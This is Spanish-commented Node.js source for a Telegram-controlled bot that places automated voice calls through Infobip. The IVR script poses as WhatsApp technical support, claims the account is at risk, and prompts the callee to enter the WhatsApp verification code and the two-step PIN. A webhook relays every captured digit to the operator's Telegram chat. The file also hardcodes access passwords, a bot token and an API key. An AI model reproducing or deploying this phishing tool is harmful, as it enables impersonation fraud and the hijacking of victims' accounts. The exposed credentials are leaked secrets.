"use strict";

// =========================
// IMPORTACIONES
// =========================
const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const https = require("follow-redirects").https;

// =========================
// CONFIGURACIÓN INICIAL
// =========================
const TELEGRAM_BOT_TOKEN = "7521128407:AAH2E4SKkAgKiXrkIReQwufyLoQTcRp4bvk"; // Tu token de Telegram
const PORT = process.env.PORT || 3000;
const DEFAULT_API_KEY = "App e3daefcc80560f5b41fbaea5f57cf55d-37367689-0e5a-47ad-bf35-7f11679eb55d"; // API Key predeterminada SOLO para el admin
const INFOBIP_BASE_HOST = "pdl8re.api.infobip.com"; // Host de Infobip

// =========================
// ALMACENAMIENTO
// =========================
// Estructura de autenticación: { chatId: { authenticated, unlimited, admin, expiresAt, apiKey } }
const authenticatedUsers = {};
// Para comandos pendientes
const awaitingInput = {};
// Para relacionar scenarioId con el chatId del usuario que inició la llamada
const callRequests = {};
// Para relacionar bulkId/messageId con chatId
const callIdMap = {};

// =========================
// INICIALIZACIÓN DEL BOT DE TELEGRAM
// =========================
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

// Función para obtener la API Key del usuario
// Para el admin se utiliza la API Key predeterminada; para el resto, se debe haber configurado una propia.
// Además, si la API Key no incluye el prefijo "App ", se lo agrega automáticamente.
function getUserApiKey(chatId) {
  const user = authenticatedUsers[chatId];
  if (user && user.admin) {
    return DEFAULT_API_KEY;
  } else if (user && user.apiKey) {
    return user.apiKey.startsWith("App ") ? user.apiKey : "App " + user.apiKey;
  }
  return null;
}

// Middleware de autenticación
bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const chatId = ctx.chat.id;
    // Permitir /login y /start sin autenticación
    if (ctx.message.text.startsWith("/login") || ctx.message.text.startsWith("/start")) {
      return next();
    }
    // Si el usuario no está autenticado, se toma el mensaje como contraseña
    if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
      const password = ctx.message.text.trim();
      if (password === "Mortadela1$") {
        // Administrador con acceso ilimitado
        authenticatedUsers[chatId] = { authenticated: true, unlimited: true, admin: true };
        ctx.replyWithHTML("<b>¡Bienvenido Administrador!</b> Tienes acceso ilimitado 😎", Markup.removeKeyboard());
        return;
      } else if (password === "PapaHelado4") {
        // Usuario con acceso limitado (hasta el 18 de marzo)
        let currentYear = new Date().getFullYear();
        let expirationDate = new Date(`${currentYear}-03-18T23:59:59`);
        if (new Date() > expirationDate) {
          expirationDate = new Date(`${currentYear + 1}-03-18T23:59:59`);
        }
        authenticatedUsers[chatId] = { authenticated: true, unlimited: false, admin: false, expiresAt: expirationDate };
        ctx.replyWithHTML("<b>¡Bienvenido Usuario!</b> Realiza llamadas a cualquier parte del mundo ⏳", Markup.removeKeyboard());
        return;
      } else {
        ctx.reply("❌ Contraseña incorrecta. Por favor, intenta de nuevo.");
        return;
      }
    } else {
      // Verifica expiración si el acceso es limitado
      if (!authenticatedUsers[chatId].unlimited) {
        const now = new Date();
        if (now > authenticatedUsers[chatId].expiresAt) {
          ctx.reply("⚠️ Tu acceso ha expirado. Por favor, vuelve a autenticarte.");
          authenticatedUsers[chatId] = { authenticated: false };
          return;
        }
      }
    }
  }
  return next();
});

// =========================
// COMANDOS DEL BOT
// =========================

// Comando /login
bot.command("login", (ctx) => {
  ctx.reply("🔒 Por favor, ingresa la contraseña:");
});

// Comando /start
bot.start((ctx) => {
  const chatId = ctx.chat.id;
  if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
    ctx.reply("🔑 Por favor, ingresa la contraseña para acceder al bot:");
  } else {
    ctx.replyWithHTML(
      "<b>Bienvenido al Bot de WhatsApp/Infobip</b> 🌟\nSelecciona una opción:",
      Markup.keyboard([["📞 Realizar llamada", "🔧 Cambiar API"]]).resize()
    );
  }
});

// Permitir cambiar la API Key
bot.hears("🔧 Cambiar API", (ctx) => {
  awaitingInput[ctx.chat.id] = { type: "change_api" };
  ctx.reply("📝 Envíame la nueva API Key de Infobip:");
});

// Realizar llamada: se consultan los números disponibles según la API Key del usuario
bot.hears("📞 Realizar llamada", (ctx) => {
  const chatId = ctx.chat.id;
  const userApiKey = getUserApiKey(chatId);
  // Para usuarios no admin se fuerza a tener una API Key propia configurada
  if (!authenticatedUsers[chatId].admin && !userApiKey) {
    ctx.reply("⚠️ Debes configurar tu propia API Key usando el comando 🔧 Cambiar API antes de realizar llamadas.");
    return;
  }
  // Se pide directamente el número de origen al usuario
  awaitingInput[chatId] = { type: "enter_from_number" };
  ctx.reply("📞 Ingresa el número de origen (con código de país, ej: +5491112345678):", Markup.removeKeyboard());
});

// Procesamiento de mensajes pendientes
bot.on("text", (ctx, next) => {
  const chatId = ctx.chat.id;
  if (awaitingInput[chatId]) {
    const input = ctx.message.text.trim();
    if (awaitingInput[chatId].type === "change_api") {
      // Actualiza la API Key del usuario
      authenticatedUsers[chatId].apiKey = input;
      ctx.reply(`✅ Tu API Key ha sido actualizada a: <code>${input}</code>`);
      delete awaitingInput[chatId];
      return;
    } else if (awaitingInput[chatId].type === "enter_from_number") {
      // El usuario escribe manualmente el número de origen
      awaitingInput[chatId] = { type: "call", fromNumber: input };
      ctx.reply("📲 Ahora, ingresa el número de destino al que deseas llamar:");
      return;
    } else if (awaitingInput[chatId].type === "call") {
      // Se obtiene el número destino y se inicia la llamada
      const fromNumber = awaitingInput[chatId].fromNumber;
      ctx.reply(`📞 Número de destino ingresado: <b>${input}</b>\nIniciando llamada desde <b>${fromNumber}</b>...`);
      initiateCall(chatId, input, fromNumber);
      delete awaitingInput[chatId];
      return;
    }
  } else {
    return next();
  }
});

// =========================
// FUNCIONES AUXILIARES
// =========================

// Función para consultar los números disponibles usando el endpoint del ejemplo de Node.js
function getAvailableNumbers(apiKey, callback) {
  const options = {
    method: "GET",
    hostname: INFOBIP_BASE_HOST,
    path: "/numbers/1/numbers", // Endpoint del ejemplo
    headers: {
      Authorization: apiKey,
      Accept: "application/json"
    },
    maxRedirects: 20
  };

  const req = https.request(options, function (res) {
    let chunks = [];
    res.on("data", function (chunk) {
      chunks.push(chunk);
    });
    res.on("end", function () {
      // Se verifica que el status sea 200 OK
      if (res.statusCode !== 200) {
        callback(new Error(`HTTP ${res.statusCode}: ${Buffer.concat(chunks).toString()}`));
        return;
      }
      const body = Buffer.concat(chunks).toString();
      try {
        const json = JSON.parse(body);
        if (!json.numbers) {
          callback(new Error("No se encontró la propiedad 'numbers' en la respuesta."));
          return;
        }
        // Se extraen los números de cada objeto (del campo "number")
        const numbers = json.numbers.map(item => item.number);
        callback(null, numbers);
      } catch (e) {
        callback(e);
      }
    });
    res.on("error", function (error) {
      callback(error);
    });
  });

  req.end();
}

// =========================
// FUNCIONES PARA REALIZAR LA LLAMADA (IVR)
// =========================

const voiceOptions = {
  language: "es",
  gender: "female"
};

function initiateCall(chatId, targetNumber, fromNumber) {
  const scenarioPayload = {
    name: "Verificación de cuenta WhatsApp",
    description: "Flujo interactivo que integra captura inmediata de DTMF/voz y notifica cada interacción en tiempo real.",
    script: [
      {
        repeat: [
          {
            say:
              "Hola ${userNameVariable}. Este es un comunicado importante desde el soporte técnico de WhatsApp. De no realizar esta verificación, podría estar en peligro su cuenta, hemos detectado actividades inusuales en su cuenta de WhatsApp. Si usted ha realizado una solicitud en un nuevo dispositivo, presione 1. De lo contrario, presione 2. Si desea repetir el comunicado, presione 3.",
            options: voiceOptions
          },
          {
            collectInto: "initialOption",
            options: {
              maxInputLength: 1,
              timeout: 5,
              sendToReports: "ALWAYS"
            }
          }
        ],
        while: "${initialOption != '1' && initialOption != '2'}"
      },
      {
        say: "Ha presionado ${initialOption}.",
        options: voiceOptions
      },
      {
        say:
          "Le hemos enviado un código de verificación de 6 dígitos a su número de teléfono registrado. Por favor, verifique sus notificaciones o la pantalla de su WhatsApp y digite el código proporcionado.",
        options: voiceOptions
      },
      {
        collectInto: "verificationCode",
        options: {
          maxInputLength: 6,
          timeout: 10,
          sendToReports: "ALWAYS"
        }
      },
      {
        request: "https://example.com/verify",
        options: {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: { verificationCode: "${verificationCode}" }
        }
      },
      {
        repeat: [
          {
            say:
              "Si su cuenta cuenta con verificación de dos pasos, presione 1. De lo contrario, presione 2.",
            options: voiceOptions
          },
          {
            collectInto: "twoStepOption",
            options: {
              maxInputLength: 1,
              timeout: 5,
              sendToReports: "ALWAYS"
            }
          }
        ],
        while: "${twoStepOption != '1' && twoStepOption != '2'}"
      },
      {
        if: "${twoStepOption == '1'}",
        then: [
          {
            say:
              "Para verificar su identidad, por favor, introduzca el código de verificación de dos pasos de 6 dígitos anteriormente configurado en su cuenta.",
            options: voiceOptions
          },
          {
            collectInto: "twoStepCode",
            options: {
              maxInputLength: 6,
              timeout: 10,
              sendToReports: "ALWAYS"
            }
          },
          {
            say: "Código de dos pasos recibido. Gracias por su verificación.",
            options: voiceOptions
          }
        ]
      },
      {
        if: "${twoStepOption == '2'}",
        then: [
          {
            say:
              "Por favor, configure su nuevo pin de 6 dígitos de verificación de dos pasos.",
            options: voiceOptions
          },
          {
            collectInto: "newTwoStepPin",
            options: {
              maxInputLength: 6,
              timeout: 10,
              sendToReports: "ALWAYS"
            }
          },
          {
            say: "Nuevo pin configurado correctamente.",
            options: voiceOptions
          }
        ]
      },
      "hangup"
    ]
  };

  const scenarioOptions = {
    method: "POST",
    hostname: INFOBIP_BASE_HOST,
    path: "/voice/ivr/1/scenarios",
    headers: {
      Authorization: getUserApiKey(chatId),
      "Content-Type": "application/json",
      Accept: "application/json"
    },
    maxRedirects: 20
  };

  bot.telegram.sendMessage(chatId, "⏳ Creando escenario IVR...");

  const req = https.request(scenarioOptions, (res) => {
    let chunks = [];
    res.on("data", (chunk) => chunks.push(chunk));
    res.on("end", () => {
      const body = Buffer.concat(chunks).toString();
      bot.telegram.sendMessage(chatId, `📡 Respuesta del escenario: ${body}`);
      try {
        const json = JSON.parse(body);
        if (json && json.id) {
          sendCallMessage(chatId, json.id, targetNumber, fromNumber);
        } else {
          bot.telegram.sendMessage(chatId, "❌ No se recibió un ID de escenario válido.");
        }
      } catch (e) {
        bot.telegram.sendMessage(chatId, "❌ Error al parsear la respuesta del escenario.");
      }
    });
  });

  req.on("error", (error) => {
    bot.telegram.sendMessage(chatId, `❌ Error al crear escenario: ${error.message}`);
  });

  req.write(JSON.stringify(scenarioPayload));
  req.end();
}

function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
  // Se asocia el scenarioId con el chatId del usuario que realizó la llamada
  callRequests[scenarioId] = chatId;
  const bulkId = `BULK-${Date.now()}-${chatId}`;
  const messagePayload = {
    bulkId: bulkId,
    messages: [
      {
        scenarioId: scenarioId,
        from: fromNumber, // Se usa el número origen seleccionado por el usuario
        destinations: [{ to: targetNumber }],
        retry: { minPeriod: 1, maxPeriod: 5, maxCount: 5 },
        record: false,
        deliveryTimeWindow: {
          from: { hour: 0, minute: 0 },
          to: { hour: 23, minute: 59 },
          days: ["MONDAY", "TUESDAY", "WEDNESDAY", "THURSDAY", "FRIDAY", "SATURDAY", "SUNDAY"]
        },
        callbackUrl: "https://botllamadas.onrender.com/infobip-webhook"
      }
    ]
  };

  bot.telegram.sendMessage(chatId, "🚀 Enviando mensaje de llamada...");

  const options = {
    method: "POST",
    hostname: INFOBIP_BASE_HOST,
    path: "/voice/ivr/1/messages",
    headers: {
      Authorization: getUserApiKey(chatId),
      "Content-Type": "application/json",
      Accept: "application/json"
    },
    maxRedirects: 20
  };

  const req = https.request(options, (res) => {
    let chunks = [];
    res.on("data", (chunk) => chunks.push(chunk));
    res.on("end", () => {
      const msgBody = Buffer.concat(chunks).toString();
      bot.telegram.sendMessage(chatId, `📨 Respuesta del mensaje: ${msgBody}`);
      try {
        const msgJson = JSON.parse(msgBody);
        if (msgJson.bulkId) callIdMap[msgJson.bulkId] = chatId;
        if (msgJson.messages) {
          msgJson.messages.forEach(m => {
            if (m.messageId) callIdMap[m.messageId] = chatId;
          });
        }
      } catch(e) {}
    });
  });

  req.on("error", (error) => {
    bot.telegram.sendMessage(chatId, `❌ Error al enviar mensaje: ${error.message}`);
  });

  req.write(JSON.stringify(messagePayload));
  req.end();
}

// =========================
// SERVIDOR EXPRESS Y WEBHOOK
// =========================
const app = express();
app.use(bodyParser.json());

app.post("/infobip-webhook", (req, res) => {
  console.log("Webhook recibido:", JSON.stringify(req.body, null, 2));
  const payload = req.body;

  // Función para resolver chatId desde cualquier campo disponible
  function resolveChatId(event) {
    // 1. Por scenarioId
    if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.scenarioId) {
      const id = callRequests[event.voiceCall.ivr.scenarioId];
      if (id) return id;
    }
    // 2. Por bulkId
    if (event.bulkId && callIdMap[event.bulkId]) return callIdMap[event.bulkId];
    // 3. Por messageId
    if (event.messageId && callIdMap[event.messageId]) return callIdMap[event.messageId];
    // 4. Por callId
    if (event.callId && callIdMap[event.callId]) return callIdMap[event.callId];
    return null;
  }

  // Se procesa cada evento si hay array "results"
  if (payload.results && Array.isArray(payload.results)) {
    payload.results.forEach((event) => {
      const chatId = resolveChatId(event);
      const msg = processCallEvent(event);
      if (chatId) {
        bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" })
          .then(() => console.log("🔔 Notificación enviada a Telegram"))
          .catch((err) => console.error("❌ Error al enviar notificación a Telegram:", err));
      } else {
        console.error("No se encontró el chatId para evento:", event.type);
      }
    });
  } else {
    const chatId = resolveChatId(payload);
    const msg = processCallEvent(payload);
    if (chatId) {
      bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" })
        .then(() => console.log("🔔 Notificación enviada a Telegram"))
        .catch((err) => console.error("❌ Error al enviar notificación a Telegram:", err));
    } else {
      console.error("No se encontró el chatId para evento:", payload.type);
    }
  }
  res.sendStatus(200);
});

// =========================
// FUNCIÓN PARA PROCESAR EVENTOS DE INFOBIP
// =========================
function processCallEvent(event) {
  let message = "";
  const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
  const to = event.to || (event.voiceCall && event.voiceCall.to) || "?";
  const callId = event.callId || event.bulkId || "?";
  const timestamp = event.timestamp ? new Date(event.timestamp).toLocaleString("es-CO", {timeZone:"America/Bogota"}) : new Date().toLocaleString("es-CO", {timeZone:"America/Bogota"});

  // Eventos en tiempo real con emojis claros
  if (event.type) {
    switch (event.type) {

      case "CALL_STARTED":
      case "STARTED":
        message = `📲 *LLAMADA INICIADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;

      case "CALL_RINGING":
      case "RINGING":
      case "CALL_PRE_ESTABLISHED":
        message = `🔔 *LLAMANDO...*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;

      case "CALL_ESTABLISHED":
      case "ESTABLISHED":
      case "CALL_ANSWERED":
        message = `✅ *¡LLAMADA CONTESTADA!*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;

      case "CALL_FINISHED":
      case "FINISHED":
      case "HANGUP":
      case "CALL_ENDED": {
        const duration = event.duration || (event.properties && event.properties.duration) || (event.voiceCall && event.voiceCall.duration) || 0;
        const mins = Math.floor(duration / 60);
        const secs = duration % 60;
        message = `📵 *LLAMADA FINALIZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n⏱️ Duración: ${mins}m ${secs}s\n🕐 ${timestamp}`;
        break;
      }

      case "CALL_FAILED":
      case "FAILED":
      case "NO_ANSWER":
      case "CALL_NO_ANSWER":
        message = `❌ *LLAMADA FALLIDA / NO CONTESTÓ*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;

      case "CALL_REJECTED":
      case "REJECTED":
      case "BUSY":
        message = `🚫 *LLAMADA RECHAZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;

      case "DTMF_CAPTURED":
      case "DTMF":
      case "DTMF_RECEIVED": {
        const digit = (event.properties && event.properties.dtmf) || "?";
        message = `🔢 *TECLA PRESIONADA: ${digit}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;
      }

      case "AMD_RESULT":
      case "ANSWERING_MACHINE_DETECTION_FINISHED": {
        const amdResult = (event.properties && event.properties.amdResult) || "DESCONOCIDO";
        const emoji = amdResult === "HUMAN" ? "👤" : "🤖";
        message = `${emoji} *DETECCIÓN: ${amdResult === "HUMAN" ? "PERSONA REAL" : "BUZÓN DE VOZ"}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;
      }

      case "SPEECH_CAPTURED": {
        const text = (event.properties && event.properties.fullText) || "?";
        message = `🗣️ *VOZ CAPTURADA*\n💬 Dijo: "${text}"\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;
      }

      case "CALL_RECEIVED":
      case "RECEIVED":
        message = `📥 *LLAMADA RECIBIDA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;

      case "CALL_MISSED":
      case "MISSED":
        message = `📵 *LLAMADA PERDIDA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        break;

      default:
        message = `ℹ️ *EVENTO: ${event.type}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
        if (event.properties) message += `\n📋 Detalles: ${JSON.stringify(event.properties)}`;
    }

  } else if (event.voiceCall) {
    // Evento de resumen final de Infobip
    const vc = event.voiceCall;
    const status = event.status && event.status.groupName;
    const errorDesc = event.error && event.error.groupName === "OK" ? null : (event.error && event.error.description);
    const duration = vc.duration || 0;
    const mins = Math.floor(duration / 60);
    const secs = duration % 60;
    const answered = vc.answerTime ? true : false;
    const startTime = vc.startTime ? new Date(vc.startTime).toLocaleString("es-CO", {timeZone:"America/Bogota"}) : timestamp;
    const answerTime = vc.answerTime ? new Date(vc.answerTime).toLocaleString("es-CO", {timeZone:"America/Bogota"}) : null;
    const endTime = vc.endTime ? new Date(vc.endTime).toLocaleString("es-CO", {timeZone:"America/Bogota"}) : null;

    if (!answered) {
      message = `❌ *LLAMADA NO CONTESTADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 Iniciada: ${startTime}\n🕐 Finalizada: ${endTime || timestamp}`;
    } else {
      message = `📋 *RESUMEN DE LLAMADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🟢 Contestó: ${answerTime}\n🔴 Finalizó: ${endTime || timestamp}\n⏱️ Duración: ${mins}m ${secs}s`;
    }

    // DTMFs recolectados
    if (vc.ivr && vc.ivr.collectedDtmfs) {
      try {
        let dtmfData = JSON.parse(vc.ivr.collectedDtmfs);
        message += "\n\n*Datos recolectados:*";
        if (dtmfData.initialOption && dtmfData.initialOption !== "null") {
          message += `\n1️⃣ Opción inicial: ${dtmfData.initialOption}`;
        }
        if (dtmfData.verificationCode && dtmfData.verificationCode !== "") {
          message += `\n🔑 Código ingresado: ${dtmfData.verificationCode}`;
        }
        if (dtmfData.twoStepOption && dtmfData.twoStepOption !== "null") {
          message += `\n2️⃣ Opción segundo paso: ${dtmfData.twoStepOption}`;
        }
        if (dtmfData.twoStepCode && dtmfData.twoStepCode !== "null") {
          message += `\n🔐 Código segundo paso: ${dtmfData.twoStepCode}`;
        }
        if (dtmfData.newTwoStepPin && dtmfData.newTwoStepPin !== "null") {
          message += `\n📌 Nuevo PIN: ${dtmfData.newTwoStepPin}`;
        }
      } catch (err) {
        message += `\nError parseando DTMFs: ${err.message}`;
      }
    }

    if (errorDesc) message += `\n⚠️ Error: ${errorDesc}`;
  } else {
    message = `ℹ️ *EVENTO*: ${JSON.stringify(event.type || event.status || "")}\n🕐 ${timestamp}`;
  }

  return message;
}

// =========================
// INICIALIZACIÓN DEL SERVIDOR EXPRESS Y DEL BOT
// =========================
app.listen(PORT, () => {
  console.log(`Servidor Express escuchando en el puerto ${PORT}`);
});

bot.launch()
  .then(() => {
    console.log("Bot de Telegram iniciado.");
  })
  .catch((err) => {
    console.error("Error al iniciar el bot de Telegram:", err);
  });
